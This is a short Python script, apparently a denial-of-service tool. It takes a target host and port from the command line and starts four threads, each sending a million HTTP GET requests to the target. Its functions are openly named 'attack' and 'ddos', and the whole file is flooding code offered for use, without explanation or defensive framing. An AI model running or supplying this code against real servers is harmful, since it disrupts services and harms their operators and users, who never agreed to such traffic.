import os, sys, socket, threading, time

def connect(host, port):
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.connect((host, port))
    return sock

def spam(sock, host):
    for i in range(1000000):
        sock.send("GET / HTTP/1.1\r\nHost: " + host + "\r\n\r\n");
    
def attack(host, port):
    sock = connect(host, port)
    spam(sock, host)
    sock.close()
    return

def ddos(host, port):
    threads = []
    for i in range(4):
        t = threading.Thread(target=attack, args = (host, port,))
        threads.append(t)
        t.start()

def main():
    if len(sys.argv) != 3:
        sys.exit(1)
    host = sys.argv[1]
    port = int(sys.argv[2])
    ddos(host, port)

if __name__ == '__main__':
    main();
